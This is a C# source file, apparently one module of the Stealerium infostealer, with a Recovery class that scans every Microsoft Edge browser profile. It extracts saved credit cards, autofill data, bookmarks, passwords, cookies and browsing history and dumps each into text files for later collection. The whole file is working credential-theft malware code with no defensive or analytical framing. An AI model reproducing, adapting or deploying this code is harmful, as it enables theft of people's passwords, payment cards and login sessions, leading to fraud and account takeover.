using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;
using Stealerium.Target.Browsers.Chromium;

namespace Stealerium.Target.Browsers.Edge;

internal sealed class Recovery
{
	public static void Run(string sSavePath)
	{
		string path = Paths.Lappdata + Paths.EdgePath;
		if (!Directory.Exists(path))
		{
			return;
		}
		string text = sSavePath + "\\Edge";
		Directory.CreateDirectory(text);
		string[] directories = Directory.GetDirectories(path);
		foreach (string text2 in directories)
		{
			if (File.Exists(text2 + "\\Login Data"))
			{
				List<CreditCard> cCc = CreditCards.Get(text2 + "\\Web Data");
				List<AutoFill> aFills = Autofill.Get(text2 + "\\Web Data");
				List<Bookmark> bBookmarks = Bookmarks.Get(text2 + "\\Bookmarks");
				List<Password> pPasswords = Stealerium.Target.Browsers.Chromium.Passwords.Get(text2 + "\\Login Data");
				List<Cookie> cCookies = Cookies.Get(text2 + "\\Cookies");
				List<Site> sHistory = History.Get(text2 + "\\History");
				CBrowserUtils.WriteCreditCards(cCc, text + "\\CreditCards.txt");
				CBrowserUtils.WriteAutoFill(aFills, text + "\\AutoFill.txt");
				CBrowserUtils.WriteBookmarks(bBookmarks, text + "\\Bookmarks.txt");
				CBrowserUtils.WritePasswords(pPasswords, text + "\\Passwords.txt");
				CBrowserUtils.WriteCookies(cCookies, text + "\\Cookies.txt");
				CBrowserUtils.WriteHistory(sHistory, text + "\\History.txt");
			}
		}
	}
}
